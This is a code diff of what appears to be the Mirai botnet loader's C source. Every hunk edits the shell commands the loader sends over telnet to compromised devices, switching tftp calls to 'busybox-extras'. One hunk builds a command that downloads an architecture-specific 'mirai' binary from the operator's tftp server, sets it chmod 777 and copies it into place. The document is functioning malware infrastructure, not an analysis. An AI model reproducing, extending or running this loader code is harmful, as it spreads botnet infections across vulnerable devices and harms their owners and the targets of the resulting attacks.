@@ -408,7 +408,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             {
                                 conn->state_telnet = TELNET_UPLOAD_METHODS;
                                 conn->timeout = 15;
-                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                             }
                         }
                         break;
@@ -437,7 +437,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                                 printf("[FD%d] Detected architecture: \'%s\'\n", ev->data.fd, conn->info.arch);
 #endif
-                                util_sockprintf(conn->fd, "/bin/busybox no-wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                                util_sockprintf(conn->fd, "/bin/busybox no-wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                                 conn->state_telnet = TELNET_UPLOAD_METHODS;
                             }
                         }
@@ -456,7 +456,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             else
                                 conn->bin = bin;
 
-                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_UPLOAD_METHODS;
                         }
                         break;
@@ -490,7 +490,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_TFTP:
                                     conn->state_telnet = TELNET_UPLOAD_TFTP;
                                     conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s%s %s; /bin/busybox chmod 777 " FN_BINARY "; /bin/busybox cp " FN_BINARY " ~/" FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                    util_sockprintf(conn->fd, "/bin/busybox-extras tftp -g -l %s -r %s.%s%s %s; /bin/busybox chmod 777 " FN_BINARY "; /bin/busybox cp " FN_BINARY " ~/" FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                     FN_BINARY, "mirai", conn->info.arch, csz_ext, wrker->srv->tftp_host_ip);
 #ifdef DEBUG
                                     printf("tftp\n");
@@ -571,7 +571,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                     conn->echo_load_pos = 0;
                                     strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                                     conn->bin = binary_get_by_arch(conn->info.arch);
-                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                                     conn->state_telnet = TELNET_UPLOAD_METHODS;
                                     conn->retry_bin = TRUE;
                                     break;
@@ -653,7 +653,7 @@ static void *timeout_thread(void *arg)
                     conn->echo_load_pos = 0;
                     strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                     conn->bin = binary_get_by_arch(conn->info.arch);
-                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                     conn->state_telnet = TELNET_UPLOAD_METHODS;
                     conn->retry_bin = TRUE;
                 } else {
